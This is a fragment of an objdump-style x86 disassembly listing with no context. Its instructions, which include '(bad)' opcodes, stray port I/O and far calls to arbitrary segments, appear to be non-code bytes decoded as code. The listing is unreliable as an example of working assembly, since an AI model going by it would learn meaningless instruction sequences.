  41ad35:	test   cl,cl
  41ad37:	add    BYTE PTR [eax],al
  41ad39:	iret   
  41ad3a:	jne    0x41ad4d
  41ad3c:	jge    0x41ad64
  41ad3e:	int    0xd
  41ad40:	lds    edx,FWORD PTR [eax+0xd261c90]
  41ad46:	jb     0x41acfb
  41ad48:	jle    0x41acf4
  41ad4a:	xlat   BYTE PTR ds:[ebx]
  41ad4b:	jbe    0x41ad52
  41ad4d:	push   edx
  41ad4e:	test   DWORD PTR [edi-0x4c3b66da],ebp
  41ad54:	add    BYTE PTR [eax],al
  41ad56:	inc    esi
  41ad57:	mov    esi,0x69daa00b
  41ad5c:	pop    esi
  41ad5d:	scas   eax,DWORD PTR es:[edi]
  41ad5e:	dec    ebp
  41ad5f:	and    cl,BYTE PTR [edx+0x293bece7]
  41ad65:	lds    ebp,FWORD PTR [ebx+0xa4cc]
  41ad6b:	mov    BYTE PTR [ebp-0x1de7c6d5],0xca
  41ad72:	push   ebx
  41ad73:	sbb    eax,0xa244433a
  41ad78:	add    BYTE PTR [eax],al
  41ad7a:	mov    ebx,0x9d08336b
  41ad7f:	add    BYTE PTR [eax],al
  41ad81:	sub    DWORD PTR [ebx-0x61],0xffffffa3
  41ad85:	mov    ds:0xc374ceb0,al
  41ad8a:	in     eax,dx
  41ad8b:	sub    DWORD PTR [si],eax
  41ad8e:	imul   eax,DWORD PTR [eax],0x0
  41ad91:	xor    eax,0xd48865bc
  41ad96:	add    BYTE PTR [eax],al
  41ad98:	or     BYTE PTR [edi],bl
  41ad9a:	add    BYTE PTR [eax],al
  41ad9c:	test   DWORD PTR [edx],esp
  41ad9e:	adc    al,0x7
  41ada0:	jmp    0x0:0x6d046bbe
  41ada7:	adc    BYTE PTR [ebx-0x29562e22],ch
  41adad:	rcr    BYTE PTR [edi-0x7f2c2ed5],1
  41adb3:	sti    
  41adb4:	add    BYTE PTR [eax],al
  41adb6:	je     0x41adfe
  41adb8:	ds std 
  41adba:	or     al,0x6f
  41adbc:	add    BYTE PTR [eax],al
  41adbe:	mov    edx,0xe961295f
  41adc3:	cmp    BYTE PTR [eax+eax*1+0x5bab5900],0xea
  41adcb:	mov    bl,0xb5
  41adcd:	sbb    esp,DWORD PTR [esi]
  41adcf:	inc    esp
  41add0:	call   0x784aadd5
  41add5:	jp     0x41add2
  41add7:	call   0xab91:0xfd271181
  41adde:	pop    ecx
  41addf:	ss pusha 
  41ade1:	in     eax,0x6
  41ade3:	xor    ch,BYTE PTR [edx+ebp*8]
  41ade6:	dec    esi
  41ade7:	(bad)  
  41ade8:	xchg   ecx,eax
  41ade9:	mov    cl,0x91
  41adeb:	jno    0x41adb3
  41aded:	cdq    
  41adee:	js     0x41ae6a
  41adf0:	cmp    al,0xe4
  41adf2:	inc    esp
  41adf3:	mov    eax,ds:0xd39e0000
  41adf8:	pop    edx
  41adf9:	call   0x9890:0xd9b7abda
  41ae00:	outs   dx,DWORD PTR ds:[esi]
  41ae01:	adc    BYTE PTR [ecx],cl
  41ae03:	add    ebx,DWORD PTR [edi-0x3f]
  41ae06:	adc    BYTE PTR [edi-0x354bb53a],bh
  41ae0c:	(bad)  
  41ae0d:	pop    ds
  41ae0e:	aaa    
  41ae0f:	mov    bh,0x2f
  41ae11:	sbb    BYTE PTR [ebp+0x59],dl
  41ae14:	rcr    DWORD PTR [ebp-0x28],0xae
  41ae18:	bound  esp,QWORD PTR [edi+0x4fec7c42]
  41ae1e:	rcr    BYTE PTR [ecx-0x98bad3f],cl
  41ae24:	mov    edx,0xc0179d82
  41ae29:	xchg   BYTE PTR [eax],al
  41ae2b:	add    BYTE PTR [ebx+0x36e946d1],dh
  41ae31:	pop    ds
  41ae32:	and    BYTE PTR [eax+0x49],al
  41ae35:	add    BYTE PTR [eax],al
  41ae37:	pop    ds
  41ae38:	clc    
  41ae39:	repnz into 
  41ae3b:	mov    al,ds:0x95df5b
  41ae40:	sub    eax,DWORD PTR [eax]
  41ae42:	add    BYTE PTR [edx],dh
  41ae44:	cmp    bl,bl
  41ae46:	adc    dh,BYTE PTR [ebx]
  41ae48:	stc    
  41ae49:	ins    DWORD PTR es:[edi],dx
  41ae4a:	inc    ecx
  41ae4b:	mov    esi,0xc61bae49
  41ae50:	or     al,0xb3
  41ae52:	add    BYTE PTR [eax],al
  41ae54:	mov    eax,0x761d6562
  41ae59:	mov    al,0x30
  41ae5b:	xor    BYTE PTR [edx+eiz*4],ch
  41ae5e:	fimul  WORD PTR [ecx]
  41ae60:	and    DWORD PTR [ebx-0x55f5c858],edi
  41ae66:	fcom   QWORD PTR [edi]
  41ae68:	cs out 0xff,al
  41ae6b:	fidivr DWORD PTR [ecx]
  41ae6d:	inc    ecx
  41ae6e:	mov    esi,0x2ecc28
  41ae73:	add    cl,al
  41ae75:	mov    esi,0x761a7485
  41ae7a:	je     0x41ae67
  41ae7c:	add    DWORD PTR [eax+0x32],edx
  41ae7f:	fisttp QWORD PTR [edx+0x3aaa79fd]
  41ae85:	cs push ds
  41ae87:	adc    eax,0x2f2db6b6
  41ae8c:	pushf  
  41ae8d:	push   ss
  41ae8e:	sbb    al,BYTE PTR [esp+eax*1+0x0]
  41ae92:	add    dh,dl
  41ae94:	inc    ecx
  41ae95:	cmp    DWORD PTR [esi],0x633264d
  41ae9b:	add    BYTE PTR [ecx+0x0],0x0
  41ae9f:	xor    edi,ebp
  41aea1:	and    al,0x0
  41aea4:	add    ah,ch
  41aea6:	push   cs
  41aea7:	xor    edx,ecx
  41aea9:	mov    ch,0xeb
  41aeab:	jmp    DWORD PTR [ebx-0x44]
  41aeae:	loope  0x41aea0
  41aeb0:	add    DWORD PTR [ebx-0x50],ecx
  41aeb3:	test   eax,0x76c63015
  41aeb8:	cli    
  41aeb9:	cmp    DWORD PTR [ecx+0xf],0x8a50613c
  41aec0:	or     eax,0xf59020fd
  41aec5:	jmp    0x30fb7ce2
  41aeca:	test   eax,0x531c28b7
  41aecf:	jb     0x41aedc
  41aed1:	cmp    BYTE PTR [edx],dh
  41aed3:	jb     0x41ae90
  41aed5:	sbb    eax,0xf7829101
  41aeda:	pop    ds
  41aedb:	push   edx
  41aedc:	fs adc al,0xa9
  41aedf:	mov    ah,0x4d
  41aee1:	mov    ebx,0x4f60d1b4
  41aee6:	sbb    al,ch
  41aee8:	xchg   DWORD PTR [ebx-0x12],ebx
  41aeeb:	call   0x10043fab
  41aef0:	sbb    edx,edi
  41aef2:	jnp    0x41af5f
  41aef4:	adc    DWORD PTR [esi+0x2f88],ecx
  41aefa:	ja     0x41ae9c
  41aefc:	mov    eax,ds:0xd360e0b
  41af01:	loope  0x41af6d
  41af03:	je     0x41af13
  41af05:	mov    esi,0xd46e58ba
  41af0a:	mov    edi,0x7dcb802
  41af0f:	out    0xbf,al
  41af11:	jle    0x41aedf
  41af13:	jl     0x41af15
  41af15:	add    BYTE PTR [ebp+0x16],al
  41af18:	add    cl,ah
  41af1a:	test   DWORD PTR [eax],0xb6356200
  41af20:	sbb    eax,0x4dbc9b25
  41af25:	popa   
  41af26:	ins    BYTE PTR es:[edi],dx
  41af27:	mov    ds:0x507d94f9,al
  41af2c:	xchg   edi,eax
  41af2d:	jnp    0x41aee9
  41af2f:	icebp  
  41af30:	mov    esp,0x6c8ad5e2
  41af35:	shr    BYTE PTR [esi+0x682b0000],0x57
  41af3c:	data16 out 0x4d,al
  41af3f:	jmp    0x742e:0x1f3749fe
  41af46:	xor    al,0x14
  41af48:	js     0x41af53
  41af4a:	and    al,0xb1
  41af4c:	stos   DWORD PTR es:[edi],eax
  41af4d:	pop    edx
  41af4e:	lds    edx,FWORD PTR [edi-0x19]
  41af51:	push   0xed80be3a
  41af56:	add    BYTE PTR [eax],al
  41af58:	lahf   
  41af59:	inc    eax
  41af5a:	stos   BYTE PTR es:[edi],al
  41af5b:	add    BYTE PTR [eax],al
  41af5d:	mov    al,ds:0xe88b7f60
  41af62:	mov    gs,WORD PTR [esi+0x18]
  41af65:	push   ds
  41af66:	fwait
  41af67:	int    0x7a
  41af69:	shl    ch,0x0
  41af6c:	add    BYTE PTR [edx-0x1b],bh
  41af6f:	dec    edi
  41af70:	cmp    edx,DWORD PTR [edx+ecx*2]
  41af73:	ins    BYTE PTR es:[edi],dx
  41af74:	or     al,BYTE PTR [edi+0x3008]
  41af7a:	mov    gs,edx
  41af7c:	mov    ds:0x49711c76,eax
  41af81:	mov    eax,ds:0x96c4
  41af86:	repz or al,0x4d
  41af89:	add    BYTE PTR [eax],al
  41af8b:	mov    edx,DWORD PTR [edi]
  41af8d:	test   DWORD PTR [edi+esi*1+0x1ea7d285],edx
  41af94:	pop    ecx
  41af95:	push   ss
  41af96:	or     al,BYTE PTR [esi+0x21ed0774]
  41af9c:	cli    
  41af9d:	push   0x1a
  41af9f:	mov    ebx,0x2b7952d
  41afa4:	pop    ebx
  41afa5:	and    BYTE PTR [esi+0xb90028],ch
  41afab:	add    BYTE PTR [ebx+ebp*8+0x39],dl
  41afaf:	mov    esp,0xfa617b3e
  41afb4:	ret    0x14e5
  41afb7:	stos   BYTE PTR es:[edi],al
  41afb8:	lods   al,BYTE PTR ds:[esi]
  41afb9:	mov    ah,0x72
  41afbb:	push   edi
  41afbc:	xchg   ecx,eax
  41afbd:	sbb    al,0xbf
  41afbf:	test   BYTE PTR [esi],al
  41afc1:	add    BYTE PTR [eax],al
  41afc3:	out    dx,al
  41afc4:	xchg   ebx,eax
  41afc5:	dec    eax
  41afc6:	mov    WORD PTR [eax],es
  41afc8:	add    dh,dh
  41afca:	sti    
  41afcb:	rcr    BYTE PTR [ebx],1
  41afcd:	cmp    eax,0xd9b1648b
  41afd2:	adc    eax,0xba50602f
  41afd7:	dec    edx
  41afd8:	ins    BYTE PTR es:[edi],dx
  41afd9:	sbb    DWORD PTR [ecx],ecx
  41afdb:	jo     0x41b047
  41afdd:	ins    BYTE PTR es:[edi],dx
  41afde:	fist   DWORD PTR [esi]
  41afe0:	dec    edi
  41afe1:	cmp    si,sp
  41afe4:	mov    eax,0x23096e1c
  41afe9:	jle    0x41afe1
  41afeb:	push   0x85cc
  41aff0:	pop    edx
  41aff1:	aam    0x25
  41aff3:	js     0x41afba
  41aff5:	sub    cl,ch
  41aff7:	dec    ecx
  41aff8:	int    0x9d
  41affa:	arpl   cx,bx
  41affc:	dec    ecx
  41affd:	fwait
  41affe:	dec    esp
  41afff:	lds    eax,FWORD PTR [eax]
  41b001:	add    dh,ch
  41b003:	sbb    bl,BYTE PTR [esi-0xc]
  41b006:	push   cs
  41b007:	lods   al,BYTE PTR ds:[esi]
  41b008:	nop    DWORD PTR [ebx-0x14]
  41b00c:	call   0x796b4c33
  41b011:	jns    0x41b014
  41b013:	rcr    BYTE PTR [edx+0x14240000],0x55
  41b01a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b01b:	loopne 0x41b04b
  41b01d:	push   es
  41b01e:	ds jmp 0x41afe8
  41b021:	jnp    0x41afc5
  41b023:	test   eax,0xd2ca6cf4
  41b028:	xchg   esp,eax
  41b029:	adc    DWORD PTR [ebx+0x1584eb1c],ebx
  41b02f:	add    BYTE PTR [eax],al
  41b031:	cmp    DWORD PTR [edx+0x61],edi
  41b034:	iret   
  41b035:	mov    bl,0x22
  41b037:	xor    DWORD PTR [ecx],ecx
  41b039:	in     eax,dx
  41b03a:	pop    ds
  41b03b:	outs   dx,BYTE PTR ds:[esi]
  41b03c:	aad    0x15
  41b03e:	(bad)  
  41b03f:	xor    BYTE PTR [ebx-0x7d],bl
  41b042:	inc    eax
  41b043:	mov    bl,0x0
  41b045:	add    dh,bl
  41b047:	pop    ds
  41b048:	adc    al,BYTE PTR ds:0x8ea0bc50
  41b04e:	faddp  st(7),st
  41b050:	sub    edx,DWORD PTR [edx-0x75]
  41b053:	xchg   esi,eax
  41b054:	shl    edi,cl
  41b056:	or     bl,cl
  41b058:	add    BYTE PTR [eax],al
  41b05a:	sti    
  41b05b:	xchg   edi,eax
  41b05c:	xor    BYTE PTR [edi],cl
  41b05e:	xchg   edx,eax
  41b05f:	ror    ecx,0x24
  41b062:	mov    ebp,0x34860df1
  41b067:	icebp  
  41b068:	pop    esi
  41b069:	inc    ecx
  41b06a:	sbb    eax,0x4cd45beb
  41b06f:	cwde   
  41b070:	add    BYTE PTR [eax],al
  41b072:	inc    ecx
  41b073:	dec    ecx
  41b074:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b075:	or     ah,BYTE PTR [ebx-0x25]
  41b078:	or     esp,esi
  41b07a:	scas   eax,DWORD PTR es:[edi]
  41b07b:	sti    
  41b07c:	out    0x96,al
  41b07e:	(bad)  
  41b07f:	sbb    al,0x8e
  41b081:	mov    al,0x70
  41b083:	or     ecx,DWORD PTR [ebx]
  41b085:	aas    
  41b086:	and    eax,0x5a8d7ea0
  41b08b:	and    eax,0x92d65512
  41b090:	sar    ebp,cl
  41b092:	adc    DWORD PTR [edx],ebp
  41b094:	add    BYTE PTR [eax+0x0],0x0
  41b098:	xchg   BYTE PTR [edx+0x8fc09a],bh
  41b09e:	add    BYTE PTR ds:0xc8d97c10,ch
  41b0a4:	pop    es
  41b0a5:	add    BYTE PTR [eax],al
  41b0a7:	mov    esi,0xae04
  41b0ac:	repz and esp,ebp
  41b0af:	leave  
  41b0b0:	push   esi
  41b0b1:	jle    0x41b0ab
  41b0b3:	or     esi,DWORD PTR [edx]
  41b0b5:	dec    eax
  41b0b6:	sbb    al,BYTE PTR [eax]
  41b0b8:	add    BYTE PTR [edx+0x415357eb],al
  41b0be:	(bad)  
  41b0bf:	fdivr  st,st(4)
  41b0c1:	xchg   ebp,eax
  41b0c2:	pop    esi
  41b0c3:	sbb    eax,0xcb6e4ac7
  41b0c8:	outs   dx,DWORD PTR ds:[esi]
  41b0c9:	xchg   ebx,eax
  41b0ca:	rcr    DWORD PTR [ecx],1
  41b0cc:	adc    eax,0x142e5e0a
  41b0d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b0d2:	mov    BYTE PTR [ecx+0x17ba0000],cl
  41b0d8:	and    ebp,DWORD PTR [eax+0x59]
  41b0db:	or     bh,ch
  41b0dd:	retf   0x6cac
  41b0e0:	dec    esp
  41b0e1:	jge    0x41b0e3
  41b0e3:	add    BYTE PTR [ecx-0x17],ch
  41b0e6:	repnz mov WORD PTR [ebp+0x76150000],es
  41b0ed:	or     eax,DWORD PTR [eax+0x11]
  41b0f0:	add    BYTE PTR [eax],al
  41b0f2:	lods   al,BYTE PTR ds:[esi]
  41b0f3:	adc    dl,BYTE PTR [edi+0x739e5ca3]
  41b0f9:	and    edi,DWORD PTR [esi+0x16]
  41b0fc:	mov    DWORD PTR [ebx+0x1a623972],edi
  41b102:	adc    eax,0x59363f3b
  41b107:	inc    esi
  41b108:	mov    esi,DWORD PTR [esi]
  41b10a:	outs   dx,BYTE PTR ds:[esi]
  41b10b:	icebp  
  41b10c:	push   ebp
  41b10d:	jl     0x41b0ee
  41b10f:	pop    edi
  41b110:	lods   eax,DWORD PTR ds:[esi]
  41b111:	jle    0x41b137
  41b113:	(bad)  
  41b114:	mov    bl,0xf4
  41b116:	cmp    DWORD PTR [edi+eax*4],esi
  41b119:	or     al,0x65
  41b11b:	add    BYTE PTR [eax],al
  41b11d:	test   DWORD PTR [ebx],esi
  41b11f:	es dec esp
  41b121:	test   DWORD PTR [eax],eax
  41b123:	add    BYTE PTR [esi+0x4f],dh
  41b126:	mov    dl,0xa
  41b128:	inc    esi
  41b129:	pop    es
  41b12a:	pusha  
  41b12b:	js     0x41b0fd
  41b12d:	or     eax,0x5f1cebb
  41b132:	sub    DWORD PTR [esi-0x5a70993],0x33
  41b139:	out    0xe8,eax
  41b13b:	jno    0x41b1a3
  41b13d:	adc    ecx,esp
  41b13f:	inc    BYTE PTR [eax]
  41b141:	add    BYTE PTR [edi+0x63],cl
  41b144:	sbb    al,0xea
  41b146:	rol    BYTE PTR [edi],cl
  41b148:	sti    
  41b149:	out    0x7a,eax
  41b14b:	les    ebp,FWORD PTR [eax+0x4dd90000]
  41b151:	xor    al,0x6d
  41b153:	pop    ss
  41b154:	iretw  
  41b156:	sub    eax,0x18c634b0
  41b15b:	ds mov bl,0x1b
  41b15e:	out    0x89,al
  41b160:	cmc    
  41b161:	loope  0x41b167
  41b163:	adc    DWORD PTR [eax],eax
  41b165:	add    cl,dl
  41b167:	jo     0x41b178
  41b169:	add    BYTE PTR [eax-0x6d],0x0
  41b16d:	add    BYTE PTR [ebp+0xfe3b6f0],bl
  41b173:	mov    bl,0x94
  41b175:	outs   dx,DWORD PTR ds:[esi]
  41b176:	fdivr  QWORD PTR [esi-0x4f]
  41b179:	stos   BYTE PTR es:[edi],al
  41b17a:	push   ss
  41b17b:	and    DWORD PTR [edx],ebx
  41b17d:	es icebp 
  41b17f:	icebp  
  41b180:	add    BYTE PTR [ecx+0x318d0000],dh
  41b186:	cld    
  41b187:	inc    esi
  41b188:	cwde   
  41b189:	push   ebx
  41b18a:	xlat   BYTE PTR ds:[ebx]
  41b18b:	jnp    0x41b1e8
  41b18d:	fwait
  41b18e:	dec    edi
  41b18f:	push   0xbb61d45f
  41b194:	cdq    
  41b195:	jbe    0x41b184
  41b197:	cmp    al,BYTE PTR [ebx+0x23b318de]
  41b19d:	sbb    BYTE PTR [edi+0x56edd91],dl
  41b1a3:	lock or eax,0x6c00005c
  41b1aa:	cs in  eax,dx
  41b1ac:	mov    dl,0x2c
  41b1ae:	mov    esp,0x17a0e946
  41b1b3:	not    dl
  41b1b5:	adc    BYTE PTR [ecx+0x265a2f05],0xf8
  41b1bc:	xor    eax,0xd8508e3c
  41b1c1:	adc    BYTE PTR [edx+0x77],ch
  41b1c4:	stos   DWORD PTR es:[edi],eax
  41b1c5:	push   edx
  41b1c6:	sub    al,0x6b
  41b1c8:	pop    esp
  41b1c9:	fwait
  41b1ca:	mov    dl,0xc0
  41b1cc:	leave  
  41b1cd:	add    BYTE PTR [eax],al
  41b1cf:	add    DWORD PTR [ebx+ecx*2+0x0],eax
  41b1d3:	add    BYTE PTR [ebx+0x4f],bh
  41b1d6:	adc    eax,0x236827a1
  41b1db:	or     al,0xa2
  41b1dd:	add    BYTE PTR [eax],al
  41b1df:	js     0x41b1d5
  41b1e1:	repnz retf 0x82b1
  41b1e5:	sahf   
  41b1e6:	adc    ch,0x0
  41b1e9:	add    cl,dl
  41b1eb:	dec    edi
  41b1ec:	xor    eax,0x1131378a
  41b1f1:	bound  ebp,QWORD PTR ds:0xc8c74998
  41b1f7:	outs   dx,BYTE PTR ds:[esi]
  41b1f8:	add    BYTE PTR [eax],al
  41b1fa:	div    DWORD PTR [ebx]
  41b1fc:	adc    BYTE PTR [edi],cl
  41b1fe:	stos   BYTE PTR es:[edi],al
  41b1ff:	jnp    0x41b1f3
  41b201:	fld    QWORD PTR [edx]
  41b203:	fcomp  QWORD PTR [edi-0x642102b6]
  41b209:	addr16 mov ah,al
  41b20c:	add    BYTE PTR [eax],al
  41b20e:	cmp    eax,0x9dc126d0
  41b213:	in     al,0x8f
  41b215:	popf   
  41b216:	or     BYTE PTR [ebp+0x0],al
  41b219:	add    bh,bh
  41b21b:	mov    cl,0x52
  41b21d:	test   eax,0x1e299ee7
  41b222:	test   al,0x41
  41b224:	popa   
  41b225:	rol    BYTE PTR [edi-0x7b601635],1
  41b22b:	push   eax
  41b22c:	add    BYTE PTR [eax],al
  41b22e:	imul   BYTE PTR [ecx+0x439159ab]
  41b234:	lock pop es
  41b236:	repz es xchg ebx,eax
  41b239:	xchg   ebx,eax
  41b23a:	sub    BYTE PTR [ebp+ebp*2-0x21],0x13
  41b23f:	fwait
  41b240:	mov    al,ds:0x5f81a587
  41b245:	xchg   esp,eax
  41b246:	sbb    cl,ch
  41b248:	outs   dx,BYTE PTR ds:[esi]
  41b249:	pop    esp
  41b24a:	xlat   BYTE PTR ds:[ebx]
  41b24b:	inc    ebp
  41b24c:	dec    ecx
  41b24d:	mov    ch,0x55
  41b24f:	sub    ecx,DWORD PTR [ebp-0x6d5817ab]
  41b255:	pop    ebp
  41b256:	xlat   BYTE PTR ds:[ebx]
  41b257:	or     eax,0xf3b02c50
  41b25c:	xchg   ebx,eax
  41b25d:	xchg   ebx,eax
  41b25e:	ficom  WORD PTR [edx+0x22484218]
  41b264:	add    BYTE PTR [eax],al
  41b266:	mov    al,ds:0x4acd6185
  41b26b:	jne    0x41b2d5
  41b26d:	les    ebx,FWORD PTR [edx]
  41b26f:	add    BYTE PTR [eax],al
  41b271:	mov    ss,WORD PTR [eax+0x3a]
  41b274:	leave  
  41b275:	xchg   ecx,eax
  41b276:	fisttp WORD PTR [esp+esi*4]
  41b279:	add    BYTE PTR [eax],al
  41b27b:	mov    ds:0x5b542dd9,eax
  41b280:	in     eax,dx
  41b281:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b282:	jmp    0x41b2de
  41b284:	jo     0x41b272
  41b286:	ins    BYTE PTR es:[edi],dx
  41b287:	xor    eax,0x6999461c
  41b28c:	dec    esi
  41b28d:	in     al,0xa3
  41b28f:	aam    0x53
  41b291:	mov    edi,DWORD PTR [edx]
  41b293:	pop    es
  41b294:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b295:	pop    edi
  41b296:	sub    ebp,DWORD PTR [eax+0x38]
  41b299:	xor    al,0xb5
  41b29b:	cli    
  41b29c:	jb     0x41b2c3
  41b29e:	pop    es
  41b29f:	sti    
  41b2a0:	imul   edi,DWORD PTR ds:0xa8e0980e,0x7395ff7d
  41b2aa:	or     BYTE PTR [ebx+0x0],0x0
  41b2ae:	fdivr  DWORD PTR [ebp+0x548a36b1]
  41b2b4:	cdq    
  41b2b5:	clc    
  41b2b6:	js     0x41b2a6
  41b2b8:	mov    dh,0xc0
  41b2ba:	daa    
  41b2bb:	add    BYTE PTR [eax],al
  41b2bd:	lods   eax,DWORD PTR ds:[esi]
  41b2be:	rol    DWORD PTR [ecx-0x660f178d],cl
  41b2c4:	pop    ebx
  41b2c5:	call   0x25d3:0xc1f8dd58
  41b2cc:	inc    ebp
  41b2cd:	adc    al,0xa8
  41b2cf:	cld    
  41b2d0:	imul   ebx,DWORD PTR [ebp+0x71],0x24
  41b2d4:	xchg   ecx,eax
  41b2d5:	addr16 push 0xfec2603f
  41b2db:	call   0x3a4dd311
  41b2e0:	add    BYTE PTR [eax],al
  41b2e2:	pop    edi
  41b2e3:	clc    
  41b2e4:	sbb    ecx,DWORD PTR [ecx+0x36]
  41b2e7:	cmc    
  41b2e8:	dec    eax
  41b2e9:	das    
  41b2ea:	add    BYTE PTR [eax],al
  41b2ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b2ed:	sub    ecx,0xffffffca
  41b2f0:	adc    BYTE PTR ds:0xf63e2c0a,0x95
  41b2f7:	sar    BYTE PTR [esi-0x73c210e4],1
  41b2fd:	jb     0x41b2ff
  41b2ff:	add    BYTE PTR [eax+0x6c],ah
  41b302:	xchg   BYTE PTR [edi-0x30d41bb5],bl
  41b308:	push   ebx
  41b309:	adc    eax,0xa6328b01
  41b30e:	cmp    BYTE PTR [esi],dl
  41b310:	push   es
  41b311:	mov    ebx,0xf908
  41b316:	mov    ch,0x2a
  41b318:	dec    ebp
  41b319:	sahf   
  41b31a:	cmp    al,BYTE PTR [ebx+0x6b]
  41b31d:	and    eax,0xeab52f22
  41b322:	(bad)  [ecx-0x17bd02e1]
  41b328:	stc    
  41b329:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b32a:	pop    ebp
  41b32b:	pop    esp
  41b32c:	por    mm7,QWORD PTR [esi]
  41b32f:	retf   0xd3e6
  41b332:	call   DWORD PTR [ecx+eax*8]
  41b335:	(bad)  
  41b336:	sbb    al,0x67
  41b338:	(bad)  
  41b339:	dec    edi
  41b33a:	jae    0x41b3ad
  41b33c:	out    dx,al
  41b33d:	mov    esp,0x4b105cd5
  41b342:	dec    ebp
  41b343:	aaa    
  41b344:	retf   
  41b345:	push   es
  41b346:	mov    eax,ds:0xea04a1
  41b34b:	add    BYTE PTR [edi+0x3e],cl
  41b34e:	mov    bl,0x33
  41b350:	mov    edx,0x64776eae
  41b355:	mov    esi,0x84c6742d
  41b35a:	aam    0x0
  41b35c:	add    BYTE PTR [ebp+0x535fdad3],dl
  41b362:	ins    BYTE PTR es:[edi],dx
  41b363:	mov    ah,BYTE PTR [edi-0x33]
  41b366:	popf   
  41b367:	xchg   esi,eax
  41b368:	sub    eax,0xf076e76b
  41b36d:	inc    ebx
  41b36e:	xor    eax,0x70ae152c
  41b373:	push   eax
  41b374:	cs mov ebp,0x5a02e562
  41b37a:	dec    ebp
  41b37b:	adc    eax,0xc980
  41b380:	sbb    BYTE PTR [eax-0x57],cl
  41b383:	add    BYTE PTR [eax],al
  41b385:	loop   0x41b3d6
  41b387:	jne    0x41b30a
  41b389:	popa   
  41b38a:	sbb    DWORD PTR [ecx+0x70],ebp
  41b38d:	sahf   
  41b38e:	inc    ebx
  41b38f:	jns    0x41b376
  41b391:	or     ch,ch
  41b393:	aas    
  41b394:	pop    ss
  41b395:	xchg   edi,eax
  41b396:	iret   
  41b397:	push   es
  41b398:	sub    eax,ecx
  41b39a:	lods   eax,DWORD PTR ds:[esi]
  41b39b:	rcr    DWORD PTR [ecx+0x23],0x5c
  41b39f:	fnstsw WORD PTR [ebx+0x5b33bf57]
  41b3a5:	enter  0x17,0x0
  41b3a9:	mov    edx,0x9a41d182
  41b3ae:	fcmovne st,st(0)
  41b3b0:	lahf   
  41b3b1:	add    BYTE PTR [eax],al
  41b3b3:	cld    
  41b3b4:	lods   eax,DWORD PTR ds:[esi]
  41b3b5:	jnp    0x41b421
  41b3b7:	or     eax,0xfd570312
  41b3bc:	outs   dx,DWORD PTR ds:[esi]
  41b3bd:	sub    ch,ah
  41b3bf:	retf   0xe39b
  41b3c2:	mov    esp,0x45b14598
  41b3c7:	fdiv   QWORD PTR [edi+0x7b]
  41b3ca:	mov    ebx,0xff4b778e
  41b3cf:	jbe    0x41b442
  41b3d1:	and    bh,BYTE PTR [ebp-0x4b]
  41b3d4:	mov    ebp,0x1911be96
  41b3d9:	rol    BYTE PTR [ebx-0x7d],cl
  41b3dc:	add    BYTE PTR [edx],bl
  41b3de:	add    BYTE PTR [eax],al
  41b3e0:	sub    dl,BYTE PTR [ecx+0x46a36c03]
  41b3e6:	jg     0x41b387
  41b3e8:	ja     0x41b45c
  41b3ea:	jg     0x41b422
  41b3ec:	out    dx,al
  41b3ed:	push   ss
  41b3ee:	mov    BYTE PTR [eax+eax*1+0x0],bh
  41b3f2:	xchg   edi,eax
  41b3f3:	sbb    DWORD PTR [esp-0x1b],esp
  41b3f7:	or     al,0x62
  41b3f9:	add    BYTE PTR [eax],al
  41b3fb:	adc    al,0x51
  41b3fd:	scas   eax,DWORD PTR es:[edi]
  41b3fe:	sar    esi,cl
  41b400:	arpl   WORD PTR [ebx+0x60],ax
  41b403:	out    0xbd,eax
  41b405:	add    BYTE PTR [ebx-0x69950000],ah
  41b40b:	pop    ebp
  41b40c:	cld    
  41b40d:	or     DWORD PTR [edi],ebx
  41b40f:	adc    al,0xc8
  41b411:	mov    eax,ds:0x6d40000
  41b416:	aaa    
  41b417:	xchg   ecx,edx
  41b419:	cmc    
  41b41a:	push   ebx
  41b41b:	sbb    bh,BYTE PTR [eax]
  41b41d:	int    0xbc
  41b41f:	mov    bl,BYTE PTR [edi+edi*8+0x23941939]
  41b426:	(bad)
  41b42a:	je     0x41b44e
  41b42c:	mov    edi,0xa8dcf2f8
  41b431:	pusha  
  41b432:	out    dx,al
  41b433:	xchg   ebp,eax
  41b434:	mov    ecx,0xec4c31
  41b439:	add    BYTE PTR [ebx+0x67],ah
  41b43c:	adc    BYTE PTR [ecx+esi*4-0x4d],0x65
  41b441:	mov    WORD PTR [ecx-0x58920000],cs
  41b447:	add    al,0xf6
  41b449:	add    BYTE PTR [eax],al
  41b44b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b44c:	nop
  41b44d:	ror    DWORD PTR [esp+edi*8+0x428e0000],1
  41b454:	inc    edx
  41b455:	pop    es
  41b456:	mov    ebp,0xc4b5091
  41b45b:	pusha  
  41b45c:	add    BYTE PTR [eax],al
  41b45e:	hlt    
  41b45f:	push   ecx
  41b460:	mov    esp,0x2c85e52b
  41b465:	mov    dh,0xc7
  41b467:	push   ds
  41b468:	xor    al,0x20
  41b46a:	jg     0x41b4a8
  41b46c:	inc    esi
  41b46d:	push   0x4acc90
  41b472:	add    dl,bl
  41b474:	push   ss
  41b475:	fisub  WORD PTR [eax]
  41b477:	pop    edi
  41b478:	jnp    0x41b438
  41b47a:	xor    al,0xaf
  41b47c:	xor    dh,BYTE PTR [ecx+0x7fdfddd1]
  41b482:	not    DWORD PTR [ecx+edx*1+0x17aedc12]
  41b489:	dec    edx
  41b48a:	test   al,0xfb
  41b48c:	adc    DWORD PTR [edx-0x6c],ecx
  41b48f:	mov    dl,0xe7
  41b491:	outs   dx,BYTE PTR ds:[esi]
  41b492:	pop    esi
  41b493:	pushf  
  41b494:	ds scas al,BYTE PTR es:[edi]
  41b496:	inc    eax
  41b497:	cmp    al,BYTE PTR [eax]
  41b499:	add    BYTE PTR [eax],dh
  41b49b:	inc    ecx
  41b49c:	scas   eax,DWORD PTR es:[edi]
  41b49d:	push   esp
  41b49e:	leave  
  41b49f:	cmp    BYTE PTR [edi],cl
  41b4a1:	shl    BYTE PTR [ebx-0x64],cl
  41b4a4:	loopne 0x41b4c1
  41b4a6:	pop    ds
  41b4a7:	fdivrp st(2),st
  41b4a9:	or     esi,eax
  41b4ab:	call   0x2e4fdaee
  41b4b0:	daa    
